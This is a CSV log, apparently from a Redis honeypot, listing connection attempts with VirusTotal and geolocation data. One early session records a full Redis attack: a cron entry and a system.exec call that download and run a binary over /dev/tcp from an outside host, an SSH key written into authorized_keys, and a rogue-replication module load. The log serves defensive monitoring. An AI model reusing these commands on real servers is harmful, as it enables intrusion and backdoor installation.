time,action,Anon Src IP,src_port,level,VT Malicious,VT Engines,VT Labels,VT Reputation,Geo Location,ISP,Unnamed: 11,VT Tags,Malicious_Flag
4/9/2025 12:53,info server,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,FLUSHDB,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q X5FmC19BqB;then exec 6<>/dev/tcp/103.67.78.71/60141 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/X5FmC19BqB ;fi && chmod +x /tmp/X5FmC19BqB && /tmp/X5FmC19BqB WyMyTNWomKSxIAHvUFU6UVjwBS2ju5mhyVM7OjgnNDlM06GVvLMkBfNIVjJeRvAFIa27l6nJUDw5ICYyOlXHqJ+5rSMG719fLlBZ+wclsr6eudRbJDImIi08Vsmol725IwHwWlcgVl/2HyKwpJ2q0kw4MScsNTpT062PvrQ7A/JfSTRJWvgLI7O7m63HWiQxJy8tP1XJq5y/uSMB8FhfIF9G8wMnrbibrMlXPzkgJjI7UsehgbiyLB/0WEkyVV37ByWyuZe501UkMSUgLTta0LeZvLkjAfBZVCBTX+8DJrWknq/STDswJCw1OlPWoI+7si0f8llJMVZb7wAhtbCZqdZTOSMiIS04UdG3nrO1OwXyUlEwVlrzES2tuJ6gyVskMSYsNTpT16GPvrQ7A/JeSTFfUe8ALLewmanWUz4jIiEtOFHQt5mzrScG+15XMVde4Qk7sbuWt9ZRPy0kJjMwVNeon7mjIQbvWlQ2SVn4BTuyvJmj0VI7MCA2OyRQ1qCBs7A7A/FeXTZXWfIINbe9gavUVCQxJiAtM1fdr5+7siYR9V9JMlRe7wMltKSdq9ZYPDMnIjMqWsmrnrOtJAD2RlY0VlL3ASS3uI+hyVA7OjgjNiRT0qqVvLMkAfVIXy5VWfgfJ7a5gazfWDwzJyc1KlrJq56zrSQA9kZWNFdS9wEksrKPrdBMODAgODE5VcmvmbC1JQDxWkc0UEbzBSCtu52oyVM8NCwgMztS1Lmbva0nAvZGUTVJWfIEL7W6nqrWQjItJCc6JFrUt567tS8H8VlUNFa9sYVd5PhICHO30FrfvLgyEYZmi8JXfbrnu75A9us=\n""",216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,config set rdbcompression no,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,config set dir .,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,save,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,config set rdbcompression yes,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,config set dbfilename dump.rdb,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,config set dir /root/.ssh/,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,config set dbfilename authorized_keys,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,SLAVEOF 103.67.78.71 60141,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,CONFIG SET dir /tmp/,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,CONFIG SET dbfilename exp.so,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,MODULE LOAD /tmp/exp.so,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:53,SLAVEOF NO ONE,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:54,"system.exec ""bash -c \""exec 6<>/dev/tcp/103.67.78.71/60141 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/X5FmC19BqB && chmod +x /tmp/X5FmC19BqB && /tmp/X5FmC19BqB WyMyTNWomKSxIAHvUFU6UVjwBS2ju5mhyVM7OjgnNDlM06GVvLMkBfNIVjJeRvAFIa27l6nJUDw5ICYyOlXHqJ+5rSMG719fLlBZ+wclsr6eudRbJDImIi08Vsmol725IwHwWlcgVl/2HyKwpJ2q0kw4MScsNTpT062PvrQ7A/JfSTRJWvgLI7O7m63HWiQxJy8tP1XJq5y/uSMB8FhfIF9G8wMnrbibrMlXPzkgJjI7UsehgbiyLB/0WEkyVV37ByWyuZe501UkMSUgLTta0LeZvLkjAfBZVCBTX+8DJrWknq/STDswJCw1OlPWoI+7si0f8llJMVZb7wAhtbCZqdZTOSMiIS04UdG3nrO1OwXyUlEwVlrzES2tuJ6gyVskMSYsNTpT16GPvrQ7A/JeSTFfUe8ALLewmanWUz4jIiEtOFHQt5mzrScG+15XMVde4Qk7sbuWt9ZRPy0kJjMwVNeon7mjIQbvWlQ2SVn4BTuyvJmj0VI7MCA2OyRQ1qCBs7A7A/FeXTZXWfIINbe9gavUVCQxJiAtM1fdr5+7siYR9V9JMlRe7wMltKSdq9ZYPDMnIjMqWsmrnrOtJAD2RlY0VlL3ASS3uI+hyVA7OjgjNiRT0qqVvLMkAfVIXy5VWfgfJ7a5gazfWDwzJyc1KlrJq56zrSQA9kZWNFdS9wEksrKPrdBMODAgODE5VcmvmbC1JQDxWkc0UEbzBSCtu52oyVM8NCwgMztS1Lmbva0nAvZGUTVJWfIEL7W6nqrWQjItJCc6JFrUt567tS8H8VlUNFa9sYVd5PhICHO30FrfvLgyEYZmi8JXfbrnu75A9us=\""""",216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:54,config set dbfilename dump.rdb,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:54,config set dir .,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:54,"system.exec ""rm -rf /tmp/exp.so""",216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:54,SLAVEOF NO ONE,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:54,Closed,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 12:54,MODULE UNLOAD system,216.164.68.72,59718,info,4,"Criminal IP, Cluster25, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 13:26,info,83.20.160.243,48954,info,1,Guardpot,malicious,0,US,AS8075 Microsoft Corporation,,,0
4/9/2025 13:26,Closed,83.20.160.243,48954,info,1,Guardpot,malicious,0,US,AS8075 Microsoft Corporation,,,0
4/9/2025 13:26,NewConnect,83.20.160.243,48954,info,1,Guardpot,malicious,0,US,AS8075 Microsoft Corporation,,,0
4/9/2025 13:27,NewConnect,216.173.190.199,59262,info,4,"ArcSight Threat Intelligence, CyRadar, Fortinet, SOCRadar","malware, malicious",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 13:27,Closed,216.173.190.199,59262,info,4,"ArcSight Threat Intelligence, CyRadar, Fortinet, SOCRadar","malware, malicious",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 13:27,info,216.173.190.199,59262,info,4,"ArcSight Threat Intelligence, CyRadar, Fortinet, SOCRadar","malware, malicious",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 15:46,NewConnect,156.222.214.196,60021,info,4,"Cyble, CyRadar, Forcepoint ThreatSeeker, SOCRadar",malicious,-3,RU,,,,0
4/9/2025 15:46,GET / HTTP/1.0,156.222.214.196,60021,info,4,"Cyble, CyRadar, Forcepoint ThreatSeeker, SOCRadar",malicious,-3,RU,,,,0
4/9/2025 15:46,Closed,156.222.214.196,60021,info,4,"Cyble, CyRadar, Forcepoint ThreatSeeker, SOCRadar",malicious,-3,RU,,,,0
4/9/2025 15:56,NewConnect,174.227.211.151,59240,info,1,SOCRadar,malware,-2,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 15:56,Closed,174.227.211.151,59240,info,1,SOCRadar,malware,-2,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 15:56,info,174.227.211.151,59240,info,1,SOCRadar,malware,-2,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 16:43,info,169.22.147.68,45148,info,0,,,0,CN,AS4837 CHINA UNICOM China169 Backbone,,,0
4/9/2025 16:43,help,169.22.147.68,45148,info,0,,,0,CN,AS4837 CHINA UNICOM China169 Backbone,,,0
4/9/2025 16:43,NewConnect,169.22.147.68,45148,info,0,,,0,CN,AS4837 CHINA UNICOM China169 Backbone,,,0
4/9/2025 16:43,Closed,169.22.147.68,45148,info,0,,,0,CN,AS4837 CHINA UNICOM China169 Backbone,,,0
4/9/2025 16:49,info,220.35.55.7,36148,info,0,,,0,HK,AS396982 Google LLC,,,0
4/9/2025 16:49,Closed,220.35.55.7,36148,info,0,,,0,HK,AS396982 Google LLC,,,0
4/9/2025 16:49,NewConnect,220.35.55.7,36148,info,0,,,0,HK,AS396982 Google LLC,,,0
4/9/2025 17:45,Closed,167.41.102.109,41534,info,2,"CyRadar, SOCRadar","malicious, malware",0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 17:45,info,167.41.102.109,41534,info,2,"CyRadar, SOCRadar","malicious, malware",0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 17:45,NewConnect,167.41.102.109,41534,info,2,"CyRadar, SOCRadar","malicious, malware",0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 17:52,PING,128.255.73.110,39890,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
4/9/2025 17:52,NewConnect,128.255.73.110,39890,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
4/9/2025 17:52,Closed,128.255.73.110,39890,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
4/9/2025 17:52,QUIT,128.255.73.110,39890,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
4/9/2025 17:52,NONEXISTENT,128.255.73.110,39890,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
4/9/2025 17:52,INFO,128.255.73.110,39890,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
4/9/2025 19:45,NewConnect,73.224.11.95,37333,info,2,"Criminal IP, SOCRadar","malicious, malware",0,CN,AS45090 Shenzhen Tencent Computer Systems Company Limited,,,0
4/9/2025 19:45,info,73.224.11.95,37333,info,2,"Criminal IP, SOCRadar","malicious, malware",0,CN,AS45090 Shenzhen Tencent Computer Systems Company Limited,,,0
4/9/2025 19:45,Closed,73.224.11.95,37333,info,2,"Criminal IP, SOCRadar","malicious, malware",0,CN,AS45090 Shenzhen Tencent Computer Systems Company Limited,,,0
4/9/2025 20:13,NewConnect,182.15.65.154,53550,info,7,"ADMINUSLabs, Criminal IP, CINS Army, CyRadar, Fortinet, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 20:13,info,182.15.65.154,53550,info,7,"ADMINUSLabs, Criminal IP, CINS Army, CyRadar, Fortinet, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 20:13,Closed,182.15.65.154,53550,info,7,"ADMINUSLabs, Criminal IP, CINS Army, CyRadar, Fortinet, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/9/2025 22:30,info,188.46.218.236,40508,info,1,SOCRadar,malware,-1,CN,AS4811 China Telecom (Group),,,0
4/9/2025 22:30,NewConnect,188.46.218.236,40508,info,1,SOCRadar,malware,-1,CN,AS4811 China Telecom (Group),,,0
4/9/2025 22:30,Closed,188.46.218.236,40508,info,1,SOCRadar,malware,-1,CN,AS4811 China Telecom (Group),,,0
4/10/2025 0:23,NewConnect,102.68.241.187,53578,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:23,"�� �%!k�����:����2htb.��n. `~���8O���{""��f'",102.68.241.187,53578,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:23,Closed,102.68.241.187,53578,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:23,NewConnect,102.68.241.187,53584,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:23,NewConnect,102.68.241.187,38578,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:23,info,102.68.241.187,38578,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:23,Closed,102.68.241.187,53584,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:24,Closed,102.68.241.187,49486,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:24,info all,102.68.241.187,49486,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:24,Closed,102.68.241.187,49478,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:24,ping,102.68.241.187,49478,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:24,NewConnect,102.68.241.187,49478,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:24,Closed,102.68.241.187,38578,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 0:24,NewConnect,102.68.241.187,49486,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, G-Data, Lionic, SOCRadar","malicious, malware, phishing",0,US,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,,,0
4/10/2025 2:17,CONNECT ipaddress.vanhoang.id.vn:443 HTTP/1.1,191.192.228.170,63912,info,1,CRDF,malicious,0,VN,AS63734 365 Online technology joint stock company,,,0
4/10/2025 2:17,Closed,191.192.228.170,63912,info,1,CRDF,malicious,0,VN,AS63734 365 Online technology joint stock company,,,0
4/10/2025 2:17,NewConnect,191.192.228.170,63912,info,1,CRDF,malicious,0,VN,AS63734 365 Online technology joint stock company,,,0
4/10/2025 2:28,NewConnect,123.179.72.64,55466,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
4/10/2025 2:28,NewConnect,123.179.72.64,55480,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
4/10/2025 2:28,PING,123.179.72.64,55480,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
4/10/2025 2:28,INFO,123.179.72.64,55480,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
4/10/2025 2:28,NONEXISTENT,123.179.72.64,55480,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
4/10/2025 2:28,QUIT,123.179.72.64,55480,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
4/10/2025 2:28,Closed,123.179.72.64,55480,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
4/10/2025 2:28,Closed,123.179.72.64,55466,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
4/10/2025 2:39,NewConnect,208.242.8.14,45660,info,2,"Criminal IP, SOCRadar","malicious, malware",0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/10/2025 2:39,hello 3,208.242.8.14,45660,info,2,"Criminal IP, SOCRadar","malicious, malware",0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/10/2025 2:39,ping,208.242.8.14,45660,info,2,"Criminal IP, SOCRadar","malicious, malware",0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/10/2025 2:39,info server,208.242.8.14,45660,info,2,"Criminal IP, SOCRadar","malicious, malware",0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/10/2025 2:39,Closed,208.242.8.14,45660,info,2,"Criminal IP, SOCRadar","malicious, malware",0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
4/10/2025 9:53,Closed,238.228.121.158,52146,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:53,GET / HTTP/1.1,238.228.121.158,52146,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:53,NewConnect,238.228.121.158,52146,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:55,Closed,238.228.121.158,37000,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:55,GET / HTTP/1.1,238.228.121.158,37000,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:55,NewConnect,238.228.121.158,37000,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:57,NewConnect,238.228.121.158,44230,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:57,{w���ı���@ȬDg7I���4����J�%���/�+���� ��,238.228.121.158,44230,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:57,,238.228.121.158,44230,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:57,Closed,238.228.121.158,44230,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:58,NewConnect,238.228.121.158,49398,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:58,PING,238.228.121.158,49402,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:58,INFO,238.228.121.158,49402,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:58,QUIT,238.228.121.158,49402,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:58,Closed,238.228.121.158,49402,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:58,NewConnect,238.228.121.158,49402,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:58,NONEXISTENT,238.228.121.158,49402,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:58,Closed,238.228.121.158,49398,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:59,NewConnect,238.228.121.158,38296,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:59,SSH-2.0-Go,238.228.121.158,38296,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:59,"L�n E��B�G���'�wcurve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1[ssh-rsa-cert-v01@openssh.com,ssh-dss-cert-v01@openssh.com,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-rsa,ssh-dss,ssh-ed25519,ssh-rsa-cert-v01@openssh.com,ssh-dss-cert-v01@openssh.com,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-rsa,ssh-dss,ssh-ed25519�aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128�aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128$hmac-sha2-256,hmac-sha1,hmac-sha1-96$hmac-sha2-256,hmac-sha1,hmac-sha1-96nonenone�*_o٠+H��""������",238.228.121.158,38296,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 9:59,Closed,238.228.121.158,38296,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
4/10/2025 10:01,NewConnect,238.228.121.158,41206,info,0,,,0,US,"AS16509 Amazon.com, Inc.",,,0
